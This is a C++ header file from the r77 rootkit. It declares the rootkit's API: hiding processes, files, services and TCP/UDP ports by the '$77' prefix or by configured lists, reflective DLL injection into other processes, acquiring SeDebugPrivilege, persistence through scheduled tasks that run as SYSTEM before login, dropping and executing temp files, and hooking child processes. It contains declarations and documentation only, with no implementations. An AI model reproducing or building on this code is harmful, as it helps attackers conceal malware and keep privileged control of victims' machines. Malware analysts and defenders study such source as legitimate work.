#pragma warning(disable: 6258) // Using TerminateThread does not allow proper thread clean up.
#pragma warning(disable: 26812) // The enum type is unscoped. Prefer 'enum class' over 'enum'
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "shlwapi.lib")

#include <Windows.h>
#include <winternl.h>
#include <Shlwapi.h>
#include <Psapi.h>
#include <aclapi.h>
#include <initguid.h>
#include <MSTask.h>
#include <stdio.h>
#include <cwchar>
#include <time.h>
#include "ntdll.h"

// These preprocessor definitions must match the constants in GlobalAssemblyInfo.cs

/// <summary>
/// Set a random seed.
/// <para>Example: InitializeApi(INITIALIZE_API_SRAND)</para>
/// </summary>
#define INITIALIZE_API_SRAND					1
/// <summary>
/// Obtain SeDebugPrivilege, if possible.
/// <para>Example: InitializeApi(INITIALIZE_API_DEBUG_PRIVILEGE)</para>
/// </summary>
#define INITIALIZE_API_DEBUG_PRIVILEGE			2

/// <summary>
/// The prefix for name based hiding (e.g. processes, files, etc...).
/// </summary>
#define HIDE_PREFIX								L"$77"
/// <summary>
/// The length of the hide prefix, excluding the terminating null character.
/// </summary>
#define HIDE_PREFIX_LENGTH						(sizeof(HIDE_PREFIX) / sizeof(WCHAR) - 1)

/// <summary>
/// r77 header signature: The process is injected with the r77 DLL.
/// </summary>
#define R77_SIGNATURE							0x7277
/// <summary>
/// r77 header signature: The process is the r77 service process.
/// </summary>
#define R77_SERVICE_SIGNATURE					0x7273
/// <summary>
/// r77 header signature: The process is an r77 helper file (e.g. TestConsole.exe).
/// </summary>
#define R77_HELPER_SIGNATURE					0x7268

/// <summary>
/// The maximum number of processes that can be hidden by ID.
/// </summary>
#define R77_CONFIG_MAX_HIDDEN_PROCESS_IDS		100
/// <summary>
/// The maximum number of processes that can be hidden by name.
/// </summary>
#define R77_CONFIG_MAX_HIDDEN_PROCESS_NAMES		100
/// <summary>
/// The maximum number of files or directories that can be hidden by full path.
/// </summary>
#define R77_CONFIG_MAX_HIDDEN_PATHS				100
/// <summary>
/// The maximum number of services that can be hidden by name.
/// </summary>
#define R77_CONFIG_MAX_HIDDEN_SERVICE_NAMES		100
/// <summary>
/// The maximum number of local TCP ports that can be hidden.
/// </summary>
#define R77_CONFIG_MAX_HIDDEN_TCP_LOCAL_PORTS	100
/// <summary>
/// The maximum number of remote TCP ports that can be hidden.
/// </summary>
#define R77_CONFIG_MAX_HIDDEN_TCP_REMOTE_PORTS	100
/// <summary>
/// The maximum number of UDP ports that can be hidden.
/// </summary>
#define R77_CONFIG_MAX_HIDDEN_UDP_PORTS			100

/// <summary>
/// Name for the scheduled task that starts the r77 service for 32-bit processes.
/// </summary>
#define R77_SERVICE_NAME32						HIDE_PREFIX L"svc32"
/// <summary>
/// Name for the scheduled task that starts the r77 service for 64-bit processes.
/// </summary>
#define R77_SERVICE_NAME64						HIDE_PREFIX L"svc64"

/// <summary>
/// Name for the named pipe that notifies the 32-bit r77 service about new child processes.
/// </summary>
#define CHILD_PROCESS_PIPE_NAME32				L"\\\\.\\pipe\\" HIDE_PREFIX L"childproc32"
/// <summary>
/// Name for the named pipe that notifies the 64-bit r77 service about new child processes.
/// </summary>
#define CHILD_PROCESS_PIPE_NAME64				L"\\\\.\\pipe\\" HIDE_PREFIX L"childproc64"

/// <summary>
/// A callback that notifies about a process ID.
/// </summary>
typedef VOID(*PROCESSIDCALLBACK)(DWORD processId);

/// <summary>
/// Defines the r77 header.
/// </summary>
typedef struct _R77_PROCESS
{
	/// <summary>
	/// The process ID of the process.
	/// </summary>
	DWORD ProcessId;
	/// <summary>
	/// The signature (R77_SIGNATURE, R77_SERVICE_SIGNATURE, or R77_HELPER_SIGNATURE).
	/// </summary>
	WORD Signature;
	/// <summary>
	/// A function pointer to Rootkit::Detach in the remote process. This function detaches the injected r77 DLL
	/// <para>Applies only, if Signature == R77_SIGNATURE.</para>
	/// </summary>
	DWORD64 DetachAddress;
} R77_PROCESS, *PR77_PROCESS;

/// <summary>
/// Defines the global configuration for r77.
/// </summary>
typedef struct _R77_CONFIG
{
	/// <summary>
	/// The number of process ID's to hide.
	/// </summary>
	DWORD HiddenProcessIdCount;
	/// <summary>
	/// An array of process ID's to hide in addition to processes hidden by the prefix.
	/// </summary>
	LPDWORD HiddenProcessIds;
	/// <summary>
	/// The number of process names to hide.
	/// </summary>
	DWORD HiddenProcessNameCount;
	/// <summary>
	/// An array of process names to hide in addition to processes hidden by the prefix.
	/// </summary>
	LPWSTR *HiddenProcessNames;
	/// <summary>
	/// The number of files or directories to hide.
	/// </summary>
	DWORD HiddenPathCount;
	/// <summary>
	/// An array of file or directory full paths to hide in addition to files and directories hidden by the prefix.
	/// </summary>
	LPWSTR *HiddenPaths;
	/// <summary>
	/// The number of service names to hide.
	/// </summary>
	DWORD HiddenServiceNameCount;
	/// <summary>
	/// An array of service names to hide in addition to services hidden by the prefix.
	/// </summary>
	LPWSTR *HiddenServiceNames;
	/// <summary>
	/// The number of hidden local TCP ports.
	/// </summary>
	DWORD HiddenTcpLocalPortCount;
	/// <summary>
	/// An array of local TCP ports to hide.
	/// </summary>
	PUSHORT HiddenTcpLocalPorts;
	/// <summary>
	/// The number of hidden remote TCP ports.
	/// </summary>
	DWORD HiddenTcpRemotePortCount;
	/// <summary>
	/// An array of remote TCP ports to hide.
	/// </summary>
	PUSHORT HiddenTcpRemotePorts;
	/// <summary>
	/// The number of hidden UDP ports.
	/// </summary>
	DWORD HiddenUdpPortCount;
	/// <summary>
	/// An array of UDP ports to hide.
	/// </summary>
	PUSHORT HiddenUdpPorts;
} R77_CONFIG, *PR77_CONFIG;

/// <summary>
/// Defines a listener, that checks for new processes in a given interval.
/// </summary>
typedef struct _NEW_PROCESS_LISTENER
{
	/// <summary>
	/// The interval, in milliseconds, between each enumeration of running processes.
	/// </summary>
	DWORD Interval;
	/// <summary>
	/// The function that is called, when a process is found that was not present in the previous enumeration.
	/// </summary>
	PROCESSIDCALLBACK Callback;
} NEW_PROCESS_LISTENER, *PNEW_PROCESS_LISTENER;

/// <summary>
/// Initializes API features.
/// </summary>
/// <param name="flags">One or multiple flags to specify what should be initialized, or 0, if nothing should be initialized.</param>
VOID InitializeApi(DWORD flags);
/// <summary>
/// Generates a random lowercase hexadecimal string.
/// </summary>
/// <param name="str">A buffer of unicode characters to write the string to.</param>
/// <param name="length">The number of characters to write.</param>
VOID RandomString(PWCHAR str, DWORD length);
/// <summary>
/// Converts a LPCWSTR into a null terminated LPCSTR.
/// </summary>
/// <param name="str">The LPCWSTR to convert.</param>
/// <returns>
/// A newly allocated LPCSTR with the converted LPCWSTR.
/// </returns>
LPCSTR ConvertStringToAString(LPCWSTR str);
/// <summary>
/// Converts a UNICODE_STRING into a null terminated LPWSTR.
/// </summary>
/// <param name="str">The UNICODE_STRING to convert.</param>
/// <returns>
/// A newly allocated LPWSTR with the converted UNICODE_STRING.
/// </returns>
LPWSTR ConvertUnicodeStringToString(UNICODE_STRING str);
/// <summary>
/// Determines whether the operating system is a 64-bit operating system.
/// </summary>
/// <returns>
/// TRUE, if the operating system is a 64-bit operating system;
/// otherwise, FALSE.
/// </returns>
BOOL Is64BitOperatingSystem();
/// <summary>
/// Determines whether a process is a 64-bit process.
/// </summary>
/// <param name="processId">The process ID to check.</param>
/// <param name="is64Bit">A pointer to a BOOL value to write the result to.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL Is64BitProcess(DWORD processId, LPBOOL is64Bit);
/// <summary>
/// Retrieves a function from a DLL specified by a name.
/// </summary>
/// <param name="dll">The name of the DLL to retrieve the function from.</param>
/// <param name="function">The name of the function to retrieve.</param>
/// <returns>
/// A pointer to the function, or NULL, if either the DLL was not found or does not have a function by the specified name.
/// </returns>
LPVOID GetFunction(LPCSTR dll, LPCSTR function);
/// <summary>
/// Gets the integrity level of a process.
/// </summary>
/// <param name="process">The process ID to check.</param>
/// <param name="integrityLevel">A pointer to a DWORD value to write the result to.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL GetProcessIntegrityLevel(HANDLE process, LPDWORD integrityLevel);
/// <summary>
/// Gets the filename or the full path of a process.
/// </summary>
/// <param name="processId">The process ID to retrieve the filename or full path from.</param>
/// <param name="fullPath">TRUE to return the full path, FALSE to return only the filename.</param>
/// <param name="fileName">A buffer to write the filename or full path to.</param>
/// <param name="fileNameLength">The length of the fileName buffer.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL GetProcessFileName(DWORD processId, BOOL fullPath, LPWSTR fileName, DWORD fileNameLength);
/// <summary>
/// Gets the username of a process.
/// </summary>
/// <param name="process">The handle to the process to check.</param>
/// <param name="name">A buffer of unicode characters to write the result to.</param>
/// <param name="nameLength">The length of the result buffer.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL GetProcessUserName(HANDLE process, PWCHAR name, LPDWORD nameLength);
/// <summary>
/// Obtains the SeDebugPrivilege.
/// </summary>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL EnabledDebugPrivilege();
/// <summary>
/// Gets an executable resource.
/// </summary>
/// <param name="resourceID">The identifier of the resource.</param>
/// <param name="type">The type identifier of the resource.</param>
/// <param name="data">A pointer that is set to a newly allocated buffer with the resource data.</param>
/// <param name="size">A pointer to a DWORD value to write the size of the returned buffer to.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL GetResource(DWORD resourceID, PCSTR type, LPBYTE *data, LPDWORD size);
/// <summary>
/// Retrieves the full path from a file handle.
/// </summary>
/// <param name="file">A file handle to retrieve the path from.</param>
/// <param name="fileName">A buffer to write the path to.</param>
/// <param name="fileNameLength">The length of the fileName buffer.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL GetPathFromHandle(HANDLE file, LPWSTR fileName, DWORD fileNameLength);
/// <summary>
/// Reads the contents of a file.
/// </summary>
/// <param name="path">The path to the file to read.</param>
/// <param name="data">A pointer that is set to a newly allocated buffer with the file contents.</param>
/// <param name="size">A pointer to a DWORD value to write the size of the returned buffer to.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL ReadFileContent(LPCWSTR path, LPBYTE *data, LPDWORD size);
/// <summary>
/// Writes a buffer to a file.
/// </summary>
/// <param name="path">The path to the file to create.</param>
/// <param name="data">A buffer to write to the file.</param>
/// <param name="size">The number of bytes to write.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL WriteFileContent(LPCWSTR path, LPBYTE data, DWORD size);
/// <summary>
/// Creates a file with a random filename and a given extension in the temp directory and writes a given buffer to it.
/// </summary>
/// <param name="file">A buffer to write to the file.</param>
/// <param name="fileSize">The number of bytes to write.</param>
/// <param name="extension">The extension to append to the random filename, excluding the dot.</param>
/// <param name="resultPath">A buffer of unicode characters to write the path of the created file to.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL CreateTempFile(LPBYTE file, DWORD fileSize, LPCWSTR extension, LPWSTR resultPath);
/// <summary>
/// Executes a file and waits for the process to exit.
/// </summary>
/// <param name="path">The path to the file to execute.</param>
/// <param name="deleteFile">TRUE, to attempt to delete the file. A total of 10 deletion attempts with a delay of 100 ms is performed.</param>
/// <returns>
/// TRUE, if the file was successfully executed;
/// otherwise, FALSE.
/// If the file was executed, but deletion failed, TRUE is returned.
/// </returns>
BOOL ExecuteFile(LPCWSTR path, BOOL deleteFile);
/// <summary>
/// Creates a scheduled task that is set to run under the SYSTEM account before the user logs in.
/// </summary>
/// <param name="name">The name of the scheduled task.</param>
/// <param name="directory">The working directory of the scheduled task.</param>
/// <param name="fileName">The application name of the scheduled task.</param>
/// <param name="arguments">The commandline arguments to pass to the created process.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL CreateScheduledTask(LPCWSTR name, LPCWSTR directory, LPCWSTR fileName, LPCWSTR arguments);
/// <summary>
/// Starts a scheduled task.
/// </summary>
/// <param name="name">The name of the scheduled task.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL RunScheduledTask(LPCWSTR name);
/// <summary>
/// Deletes a scheduled task.
/// </summary>
/// <param name="name">The name of the scheduled task.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL DeleteScheduledTask(LPCWSTR name);
/// <summary>
/// Injects a DLL using reflective DLL injection.
/// <para>The DLL must export a function called "ReflectiveDllMain".</para>
/// <para>The bitness of the target process must match that of the current process.</para>
/// <para>The integrity level of the target process must be at least medium.</para>
/// <para>The process must not be critical.</para>
/// </summary>
/// <param name="processId">The process to inject the DLL in.</param>
/// <param name="dll">A buffer with the DLL file.</param>
/// <param name="dllSize">dllSize The size of the DLL file.</param>
/// <param name="fast">TRUE to not wait for DllMain to return. If this parameter is set, this function does not return FALSE, if DllMain returned FALSE.</param>
/// <returns>
/// TRUE, if the DLL was successfully injected and DllMain returned TRUE;
/// otherwise, FALSE.
/// </returns>
BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize, BOOL fast);
/// <summary>
/// Gets the RVA of an exported function called "ReflectiveDllMain".
/// </summary>
/// <param name="dll">A buffer with the DLL file.</param>
/// <returns>
/// The RVA of the exported function; or 0, if this function fails.
/// </returns>
DWORD GetReflectiveDllMain(LPBYTE dll);
/// <summary>
/// Converts a RVA to a file offset.
/// </summary>
/// <param name="dll">A buffer with the DLL file.</param>
/// <param name="rva">The RVA to convert.</param>
/// <returns>
/// The file offset converted from the specified RVA; or 0, if this function fails.
/// </returns>
DWORD RvaToOffset(LPBYTE dll, DWORD rva);

/// <summary>
/// Retrieves a list of all processes where an r77 header is present.
/// <para>The result includes only processes where the bitness matches that of the current process.</para>
/// </summary>
/// <param name="r77Processes">A buffer with R77_PROCESS structures to write the result to.</param>
/// <param name="count">A DWORD pointer with the number of structures in the buffer. The number of returned entries is written to this value.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL GetR77Processes(PR77_PROCESS r77Processes, LPDWORD count);
/// <summary>
/// Detaches r77 from the specified process.
/// <para>The bitness of the target process must match that of the current process.</para>
/// </summary>
/// <param name="r77Process">The process to detach r77 from.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL DetachInjectedProcess(const R77_PROCESS &r77Process);
/// <summary>
/// Detaches r77 from the specified process.
/// <para>The bitness of the target process must match that of the current process.</para>
/// </summary>
/// <param name="processId">The process ID to detach r77 from.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL DetachInjectedProcess(DWORD processId);
/// <summary>
/// Detaches r77 from all running processes.
/// <para>Only processes where the bitness matches that of the current process are detached.</para>
/// </summary>
VOID DetachAllInjectedProcesses();
/// <summary>
/// Terminates all r77 service processes. Typically, there are two active r77 service processes, one 32-bit and one 64-bit process.
/// <para>Only processes where the bitness matches that of the current process are terminated.</para>
/// </summary>
/// <param name="excludedProcessId">
/// A process ID that should not be terminated. Use -1 to not exclude any processes.
/// </param>
VOID TerminateR77Service(DWORD excludedProcessId);

/// <summary>
/// Loads the global configuration for r77.
/// </summary>
/// <returns>
/// A newly allocated R77_CONFIG structure.
/// </returns>
PR77_CONFIG LoadR77Config();
/// <summary>
/// Deletes the specified R77_CONFIG structure.
/// </summary>
/// <param name="config">The R77_CONFIG structure to delete.</param>
VOID DeleteR77Config(PR77_CONFIG config);
/// <summary>
/// Compares two R77_CONFIG structures for equality.
/// </summary>
/// <param name="configA">The first R77_CONFIG structure.</param>
/// <param name="configB">The second R77_CONFIG structure.</param>
/// <returns>
/// TRUE, if both R77_CONFIG structures are equal;
/// otherwise, FALSE.
/// </returns>
BOOL CompareR77Config(PR77_CONFIG configA, PR77_CONFIG configB);
/// <summary>
/// Deletes the r77 configuration from the registry.
/// </summary>
VOID UninstallR77Config();

/// <summary>
/// Creates a named pipe that listens for notifications about created child processes.
/// </summary>
/// <param name="callback">The function that is called, when the named pipe received a process ID.</param>
VOID ChildProcessListener(PROCESSIDCALLBACK callback);
/// <summary>
/// Notifies the child process listener about a new child process. When this function returns, the child process has been injected.
/// </summary>
/// <param name="processId">The process ID of the new process.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL HookChildProcess(DWORD processId);

/// <summary>
/// Creates a new process listener, that checks for new processes in a given interval.
/// </summary>
/// <param name="interval">The interval, in milliseconds, between each enumeration of running processes.</param>
/// <param name="callback">The function that is called, when a process is found that was not present in the previous enumeration.</param>
/// <returns>
/// A pointer to the newly created NEW_PROCESS_LISTENER structure.
/// </returns>
PNEW_PROCESS_LISTENER NewProcessListener(DWORD interval, PROCESSIDCALLBACK callback);

namespace nt
{
	NTSTATUS NTAPI NtQueryObject(HANDLE handle, nt::OBJECT_INFORMATION_CLASS objectInformationClass, LPVOID objectInformation, ULONG objectInformationLength, PULONG returnLength);
	NTSTATUS NTAPI NtCreateThreadEx(PHANDLE thread, ACCESS_MASK desiredAccess, LPVOID objectAttributes, HANDLE processHandle, LPVOID startAddress, LPVOID parameter, ULONG flags, SIZE_T stackZeroBits, SIZE_T sizeOfStackCommit, SIZE_T sizeOfStackReserve, LPVOID bytesBuffer);
}